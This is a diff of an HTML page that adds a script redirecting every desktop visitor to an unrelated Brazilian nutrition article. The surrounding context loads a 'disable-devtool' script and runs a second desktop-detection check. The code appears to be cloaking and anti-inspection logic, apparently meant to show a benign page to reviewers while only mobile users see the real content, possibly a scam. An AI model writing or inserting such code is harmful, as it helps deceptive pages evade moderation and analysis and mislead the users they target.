@@ -73,6 +73,15 @@
 
 </head>
 <body>
+    <script>
+(function () {
+    const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);
+
+    if (!isMobile) {
+        window.location.replace("https://www.nutren.com.br/mulher/artigos/ciencia-da-nutricao/bem-estar-saude");
+    }
+})();
+</script>
 <script disable-devtool-auto="" src="disable-devtool-1.html" url="https://meutudo.com.br/blog/guia-do-saque-aniversario/"></script>
 <script type="text/javascript">
   if (!navigator.userAgent.match(/(iPhone|iPod|iPad|Android|BlackBerry|IEMobile)/) && window.innerWidth > 768) {
@@ -87,4 +96,5 @@
 </div>
 
 </body>
+
 </html>
